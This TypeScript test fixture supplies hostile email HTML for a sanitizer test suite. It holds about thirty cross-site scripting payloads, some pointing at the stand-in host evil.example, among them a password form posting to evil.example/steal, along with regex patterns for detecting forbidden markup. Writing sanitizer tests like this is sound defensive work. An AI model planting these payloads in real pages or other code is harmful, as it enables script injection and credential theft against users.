/**
 * Hostile email HTML. Each entry must come out of sanitizeEmailHtml inert.
 * Add to this whenever a new vector turns up (tasks/plan.md, Risks).
 */
export const XSS: [string, string][] = [
  ["script tag", `<script>alert(1)</script>hi`],
  ["script, odd case and spacing", `<ScRiPt >alert(1)</sCrIpT >`],
  ["img onerror", `<img src=x onerror=alert(1)>`],
  ["svg onload", `<svg onload=alert(1)><circle r=1></svg>`],
  ["svg script", `<svg><script>alert(1)</script></svg>`],
  ["body onload", `<body onload=alert(1)>x</body>`],
  ["javascript: href", `<a href="javascript:alert(1)">x</a>`],
  ["javascript: href, entity-encoded", `<a href="&#106;avascript:alert(1)">x</a>`],
  ["javascript: href, tab-split", `<a href="java\tscript:alert(1)">x</a>`],
  ["vbscript href", `<a href="vbscript:msgbox(1)">x</a>`],
  ["data: html href", `<a href="data:text/html,<script>alert(1)</script>">x</a>`],
  ["iframe", `<iframe src="https://evil.example"></iframe>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
  ["object", `<object data="https://evil.example/x.swf"></object>`],
  ["embed", `<embed src="https://evil.example/x.swf">`],
  ["form", `<form action="https://evil.example/steal"><input name=p type=password><button>Log in</button></form>`],
  ["base href", `<base href="https://evil.example/">`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
  ["link stylesheet", `<link rel=stylesheet href="https://evil.example/x.css">`],
  ["style expression", `<div style="width:expression(alert(1))">x</div>`],
  ["style javascript url", `<div style="background:url(javascript:alert(1))">x</div>`],
  ["style -moz-binding", `<div style="-moz-binding:url(https://evil.example/x.xml#x)">x</div>`],
  ["style block import", `<style>@import url(https://evil.example/x.css); p{color:red}</style>`],
  ["math href", `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`],
  ["noscript breakout", `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`],
  ["template", `<template><img src=x onerror=alert(1)></template>`],
  ["comment breakout", `<!--><img src=x onerror=alert(1)>-->`],
  ["nested tag confusion", `<scr<script>ipt>alert(1)</script>`],
  ["formaction", `<button formaction="javascript:alert(1)">x</button>`],
  ["srcset", `<img srcset="https://evil.example/t.gif 1x">`],
];

/**
 * Markup that must never appear in sanitized output's structure: tag and
 * attribute names, checked with every attribute value blanked (sanitize-html
 * always double-quotes values and escapes quotes inside them).
 */
export const FORBIDDEN_STRUCTURE = [
  /<script/i,
  /<\/?(iframe|object|embed|form|input|button|base|meta|link|svg|math|template|noscript|textarea)\b/i,
  /\son[a-z]+\s*=/i,
  /\s(srcset|formaction|xlink:href)\s*=/i,
  /@import/i,
];

/** Schemes and CSS that must never appear in a URL-bearing attribute or style. */
export const FORBIDDEN_VALUES = [/javascript:/i, /vbscript:/i, /data:text\/html/i, /expression\(/i, /-moz-binding/i];

export const structureOf = (html: string) => html.replace(/="[^"]*"/g, '=""');
export const riskyValues = (html: string) => [...html.matchAll(/\s(?:href|src|background|style|action|cite)="([^"]*)"/gi)].map((m) => m[1]!).join("\n");
